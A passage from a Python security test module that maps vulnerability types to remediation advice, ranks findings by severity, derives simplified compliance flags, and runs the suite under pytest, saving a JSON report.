                'priority': self._get_priority_for_severity(severity)
            })

        # Sort by priority
        priority_order = ['critical', 'high', 'medium', 'low']
        recommendations.sort(key=lambda x: priority_order.index(x['severity']))

        return recommendations

    def _get_recommendation_for_type(self, vuln_type: str) -> str:
        """Get recommendation for specific vulnerability type."""
        recommendations = {
            'SQL Injection': 'Use parameterized queries and input validation. Consider using an ORM.',
            'Cross-Site Scripting (XSS)': 'Implement proper input sanitization and output encoding.',
            'Broken Access Control': 'Implement proper authorization checks and principle of least privilege.',
            'Path Traversal': 'Validate file paths and use allow-lists for file access.',
            'Command Injection': 'Avoid system calls with user input. Use safe APIs and input validation.',
            'Insecure Transport': 'Implement HTTPS with proper TLS configuration.',
            'Missing Security Header': 'Add recommended security headers to HTTP responses.',
            'Information Disclosure': 'Remove version information and use generic error messages.',
            'Weak Password Policy': 'Implement strong password requirements and policies.',
            'Session Fixation': 'Regenerate session IDs after authentication.',
            'Default Credentials': 'Change all default credentials and implement secure credential management.'
        }

        return recommendations.get(vuln_type, 'Review and remediate this security issue according to best practices.')

    def _get_priority_for_severity(self, severity: str) -> str:
        """Get priority level for severity."""
        priority_map = {
            'critical': 'Immediate',
            'high': 'High',
            'medium': 'Medium',
            'low': 'Low'
        }
        return priority_map.get(severity, 'Medium')

    def _check_compliance(self, vulnerabilities: list[dict[str, Any]]) -> dict[str, Any]:
        """Check compliance with security standards."""
        critical_vulns = len([v for v in vulnerabilities if v.get('severity') == 'critical'])
        high_vulns = len([v for v in vulnerabilities if v.get('severity') == 'high'])

        return {
            'owasp_top_10_compliant': critical_vulns == 0 and high_vulns == 0,
            'pci_dss_ready': critical_vulns == 0 and high_vulns <= 2,
            'gdpr_compliant': critical_vulns == 0,  # Simplified check
            'iso27001_ready': critical_vulns == 0 and high_vulns <= 3
        }


# ============================================================================
# Test Execution
# ============================================================================

@pytest.mark.asyncio
async def test_comprehensive_security_suite():
    """Run comprehensive security test suite."""
    config = SecurityTestConfig()
    runner = SecurityTestRunner(config)

    report = await runner.run_all_tests()

    # Save report to file
    report_file = f"security_test_report_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, 'w') as f:
        json.dump(report, f, indent=2, default=str)

    print(f"Security test report saved to: {report_file}")
    print(f"Overall Security Score: {report['summary']['overall_security_score']}/100")

    # Assert no critical vulnerabilities
    critical_vulns = report['summary']['vulnerability_breakdown']['critical']
    assert critical_vulns == 0, f"Found {critical_vulns} critical vulnerabilities"

    return report


if __name__ == "__main__":
    # Run security tests
    async def main():
        config = SecurityTestConfig()
        runner = SecurityTestRunner(config)

        report = await runner.run_all_tests()

        # Print summary
        print("\n" + "="*80)
        print("SECURITY TEST REPORT SUMMARY")
        print("="*80)
        print(f"Overall Security Score: {report['summary']['overall_security_score']}/100")
        print(f"Total Vulnerabilities: {report['summary']['total_vulnerabilities']}")
        print(f"Critical: {report['summary']['vulnerability_breakdown']['critical']}")
        print(f"High: {report['summary']['vulnerability_breakdown']['high']}")
        print(f"Medium: {report['summary']['vulnerability_breakdown']['medium']}")
        print(f"Low: {report['summary']['vulnerability_breakdown']['low']}")
        print(f"Pass Rate: {report['summary']['pass_rate_percent']}%")
        print("="*80)

        # Save detailed report
        report_file = f"security_test_report_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, default=str)

        print(f"Detailed report saved to: {report_file}")

    asyncio.run(main())
